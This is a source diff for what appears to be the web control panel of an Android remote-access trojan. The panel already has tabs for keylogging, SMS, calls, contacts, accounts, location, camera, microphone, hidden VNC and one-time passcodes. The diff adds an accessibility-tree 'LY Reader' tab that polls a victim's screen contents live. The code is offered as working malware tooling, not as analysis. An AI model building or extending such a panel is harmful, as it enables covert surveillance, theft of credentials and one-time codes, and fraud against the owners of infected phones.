@@ -243,7 +243,7 @@ function handleMessage(msg) {
         msg.status === 'ANSWERED' ? 'success' : 'info');
       break;
     case 'screen_hierarchy':
-      document.dispatchEvent(new CustomEvent('nx:hierarchy', { detail: msg }));
+      document.dispatchEvent(new CustomEvent('nx:hierarchy', { detail: { id: msg.id || msg.device_id, data: msg.data || msg } }));
       if (window._hvncViewer?.onHierarchy) window._hvncViewer.onHierarchy(msg.data || msg);
       break;
     case 'studio_form_data':
@@ -491,6 +491,7 @@ const DeviceDetail = {
           <SsTab       v-if="activeTab==='ss'"       :devId="devId" />
           <CameraTab   v-if="activeTab==='camera'"   :devId="devId" />
           <MicTab      v-if="activeTab==='mic'"      :devId="devId" />
+          <LyTab       v-if="activeTab==='ly'"       :devId="devId" />
         </div>
       </template>
     </div>`,
@@ -514,6 +515,7 @@ const DeviceDetail = {
       { id:'ss',       label:'Screenshots'   },
       { id:'camera',   label:'Camera'        },
       { id:'mic',      label:'Mic'           },
+      { id:'ly',       label:'LY Reader'     },
     ];
     function cmd(c, args = {}) { sendCmd(devId.value, c, args); }
     function openHVNC()   { S.activePane = 'hvnc'; }
@@ -1277,6 +1279,71 @@ const MicTab = {
   }
 };
 
+
+// ── LyTab — Accessibility Tree / Screen Reader ───────────────────────────────
+const LyTab = {
+  template: `
+    <div class="tab-scroll" style="padding:0;position:relative;overflow:hidden;height:100%">
+      <div class="ly-toolbar">
+        <button :class="['btn btn-xs', polling ? 'btn-danger' : 'btn-primary']" @click="togglePoll()">
+          {{ polling ? '⏹ Stop' : '▶ Start' }} LY Reader
+        </button>
+        <button class="btn btn-ghost btn-xs" @click="snapshot()">📸 Snap</button>
+        <span v-if="polling" class="text-green" style="font-size:11px;margin-left:6px">● LIVE</span>
+        <span v-else class="text-dim" style="font-size:11px;margin-left:6px">paused</span>
+      </div>
+      <div ref="lyContainerEl" style="position:absolute;inset:34px 0 0 0;"></div>
+    </div>`,
+  props: ['devId'],
+  setup(props) {
+    const lyContainerEl = ref(null);
+    const polling       = ref(false);
+    let reader          = null;
+
+    function sendFn(obj) { sendCmd(obj.target || props.devId, obj.cmd, obj.args || {}); }
+
+    onMounted(() => {
+      if (!lyContainerEl.value) return;
+      const dev = S.devices[props.devId] || {};
+      const sw  = dev.info?.screen_w || 1080;
+      const sh  = dev.info?.screen_h || 1920;
+      reader = new LyReader(lyContainerEl.value, props.devId, sendFn, sw, sh);
+      document.addEventListener('nx:hierarchy', onHierarchy);
+      let _ro = new ResizeObserver(() => reader?.onResize());
+      _ro.observe(lyContainerEl.value);
+    });
+
+    onUnmounted(() => {
+      reader?.stopPolling();
+      reader?.destroy();
+      reader = null;
+      document.removeEventListener('nx:hierarchy', onHierarchy);
+      _ro?.disconnect();
+      polling.value = false;
+    });
+
+    function onHierarchy(e) {
+      if (!reader) return;
+      const msg = e.detail;
+      if (msg.id && msg.id !== props.devId) return;
+      const payload = msg.data ?? msg.hierarchy ?? msg;
+      reader.update(payload);
+    }
+
+    function onResize() { reader?.onResize(); }
+
+    function togglePoll() {
+      if (!reader) return;
+      if (polling.value) { reader.stopPolling(); polling.value = false; }
+      else               { reader.startPolling(700); polling.value = true; }
+    }
+
+    function snapshot() { sendCmd(props.devId, 'REQUEST_HIERARCHY', {}); }
+
+    return { lyContainerEl, polling, togglePoll, snapshot };
+  }
+};
+
 // ── OTP Pane ──────────────────────────────────────────────────────────────────
 const OTPPane = {
   template: `
@@ -1619,14 +1686,21 @@ const App = createApp({
 // Register all device-tab components globally
 const _compNames = [
   'InfoTab','CmdTab','KeylogTab','SmsTab','CallsTab','ContactsTab',
-  'AppsTab','AccountsTab','LocationTab','FilesTab','NotifTab','SsTab','CameraTab','MicTab'
+  'AppsTab','AccountsTab','LocationTab','FilesTab','NotifTab','SsTab','CameraTab','MicTab','LyTab'
 ];
 const _comps = [
   InfoTab, CmdTab, KeylogTab, SmsTab, CallsTab, ContactsTab,
-  AppsTab, AccountsTab, LocationTab, FilesTab, NotifTab, SsTab, CameraTab, MicTab
+  AppsTab, AccountsTab, LocationTab, FilesTab, NotifTab, SsTab, CameraTab, MicTab, LyTab
 ];
 _comps.forEach((comp, i) => App.component(_compNames[i], comp));
 App.component('DeviceList',   DeviceList);
 App.component('DeviceDetail', DeviceDetail);
 
 App.mount('#app');
+
+// ── LyTab toolbar CSS (injected at runtime) ───────────────────────────────────
+(function() {
+  const s = document.createElement('style');
+  s.textContent = `.ly-toolbar{display:flex;align-items:center;gap:6px;padding:4px 8px;height:34px;background:var(--bg-1,#0d0d1a);border-bottom:1px solid var(--border,#1e1e3a);flex-shrink:0;position:absolute;top:0;left:0;right:0;z-index:1;}`;
+  document.head.appendChild(s);
+})();
